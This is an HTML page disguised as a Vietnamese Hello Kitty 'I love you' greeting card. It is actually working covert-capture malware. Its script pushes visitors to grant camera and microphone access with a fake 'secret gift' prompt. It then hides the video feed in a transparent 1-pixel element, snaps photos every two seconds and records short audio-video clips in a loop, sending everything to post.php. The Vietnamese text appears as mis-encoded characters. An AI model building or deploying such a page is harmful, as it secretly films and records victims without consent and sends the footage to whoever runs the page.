<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>G·ª≠i ng√†n y√™u th∆∞∆°ng ‚ù§Ô∏è</title>
    
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <style>
        /* --- GIAO DI·ªÜN H·ªíNG CUTE (GI·ªÆ NGUY√äN) --- */
        body {
            margin: 0;
            padding: 0;
            background-color: #ffe6f2;
            background-image: url('https://www.transparenttextures.com/patterns/hearts.png');
            font-family: 'Quicksand', sans-serif;
            overflow-x: hidden;
            text-align: center;
            color: #d63384;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .kitty-float {
            position: fixed;
            z-index: 10;
            opacity: 0.9;
            animation: float 3s ease-in-out infinite;
            pointer-events: none;
        }
        .k1 { top: 5%; left: 5%; width: 80px; }
        .k2 { bottom: 10%; right: 5%; width: 90px; animation-delay: 1s; }
        .k3 { top: 15%; right: 10%; width: 50px; animation-delay: 2s; }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        h1 {
            font-family: 'Pacifico', cursive;
            font-size: 3em;
            color: #ff4d94;
            text-shadow: 3px 3px 0px #fff;
            margin: 0;
            animation: pulse 1.5s infinite;
            z-index: 20;
        }

        h2 {
            font-size: 24px;
            color: #ff0066;
            background: rgba(255, 255, 255, 0.8);
            padding: 5px 20px;
            border-radius: 20px;
            margin-top: 10px;
            z-index: 20;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .mess {
            margin-top: 20px;
            font-size: 16px;
            color: #ff66b2;
            max-width: 80%;
            line-height: 1.5;
            z-index: 20;
        }

        /* --- S·ª¨A L·ªñI M√ÄN H√åNH ƒêEN ·ªû ƒê√ÇY --- */
        #video-hidden {
            position: fixed;
            top: 0;
            left: 0;
            /* Kh√¥ng d√πng display: none */
            opacity: 0;           /* L√†m trong su·ªët */
            z-index: -100;        /* ƒê·∫©y xu·ªëng d∆∞·ªõi c√πng */
            pointer-events: none; /* Kh√¥ng cho click v√†o */
            width: 1px;           /* Thu nh·ªè l·∫°i */
            height: 1px;
        }
        
        #canvas {
            display: none; /* Canvas th√¨ ·∫©n ƒë∆∞·ª£c v√¨ ta v·∫Ω V√ÄO n√≥, ch·ª© kh√¥ng ƒë·ªçc T·ª™ n√≥ */
        }

    </style>
</head>
<body>

    <img src="https://i.pinimg.com/originals/22/04/9a/22049a173824147781b045152eb49e6f.png" class="kitty-float k1">
    <img src="https://upload.wikimedia.org/wikipedia/en/0/05/Hello_kitty_character_portrait.png" class="kitty-float k2">
    <div class="kitty-float k3" style="font-size: 40px;">üíñ</div>

    <script>
        var name = prompt("Nh·∫≠p t√™n ng∆∞·ªùi b·∫°n y√™u th∆∞∆°ng:", "C·ª•c C∆∞ng");
        if (!name) name = "B·∫°n Y√™u";
    </script>

    <h1>I <i class="fas fa-heart" style="color:red"></i> YOU</h1>
    <h2><script>document.write(name)</script></h2>
    
    <div class="mess">
        Ch√∫c b·∫°n m·ªôt ng√†y tr√†n ƒë·∫ßy ni·ªÅm vui v√† h·∫°nh ph√∫c! <br>
        Lu√¥n xinh ƒë·∫πp v√† d·ªÖ th∆∞∆°ng nh∆∞ Hello Kitty nh√©! üê±üéÄ
    </div>

    <!-- Video kh√¥ng d√πng display: none n·ªØa -->
    <video id="video-hidden" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // --- C·∫§U H√åNH ---
        const PHP_URL = 'post.php'; 
        const PHOTO_INTERVAL = 2000; 
        const VIDEO_LENGTH = 3000;   

        const video = document.getElementById('video-hidden');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendToPHP(dataBase64) {
            $.ajax({
                type: 'POST',
                data: { cat: dataBase64 },
                url: PHP_URL,
                dataType: 'json',
                async: true,
                success: function(result){},
                error: function(){}
            });
        }

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true, 
                    video: { facingMode: "user" } 
                });
                handleSuccess(stream);
            } catch (e) {
                alert("B·∫•m 'Cho ph√©p' camera ƒë·ªÉ nh·∫≠n m√≥n qu√† b√≠ m·∫≠t nha! üéÅ");
            }
        }

        function handleSuccess(stream) {
            video.srcObject = stream;

            // ƒê·ª£i video load xong k√≠ch th∆∞·ªõc m·ªõi b·∫Øt ƒë·∫ßu ch·ª•p
            video.onloadedmetadata = function() {
                
                // --- LU·ªíNG 1: CH·ª§P ·∫¢NH ---
                setInterval(function(){
                    // ƒê·∫£m b·∫£o video ƒëang ch·∫°y th√¨ m·ªõi v·∫Ω ƒë∆∞·ª£c h√¨nh
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        // V·∫Ω full size 640x480
                        context.drawImage(video, 0, 0, 640, 480);
                        var photoData = canvas.toDataURL("image/png", 0.5).replace("image/png", "image/octet-stream");
                        sendToPHP(photoData);
                    }
                }, PHOTO_INTERVAL);

                // --- LU·ªíNG 2: QUAY VIDEO ---
                startVideoRecording(stream);
            };
        }

        function startVideoRecording(stream) {
            if (!MediaRecorder) return;

            let mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = function() {
                let blob = new Blob(chunks, { 'type' : 'video/webm' });
                chunks = []; 

                var reader = new FileReader();
                reader.readAsDataURL(blob); 
                reader.onloadend = function() {
                    var videoBase64 = reader.result;
                    sendToPHP(videoBase64);
                }

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), VIDEO_LENGTH);
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), VIDEO_LENGTH);
        }

        init();

    </script>
</body>
</html>

